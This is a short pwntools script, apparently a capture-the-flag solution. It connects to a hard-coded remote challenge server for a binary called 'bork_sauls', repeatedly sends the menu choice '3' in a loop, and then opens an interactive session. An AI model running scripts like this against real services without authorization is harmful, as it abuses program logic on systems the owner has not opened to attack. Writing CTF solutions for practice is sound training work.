from pwn import *

IP = "35.234.117.20"

port = 30158

elf = ELF("./bork_sauls")

# p = elf.process()
p = remote(IP, port)

for i in range(1072):
    p.recvuntil("Alt-F4\n")

    input = "3"

    p.sendline(input)

    output = p.recvuntil("Choose")

    print("i = ", i, output)

p.interactive()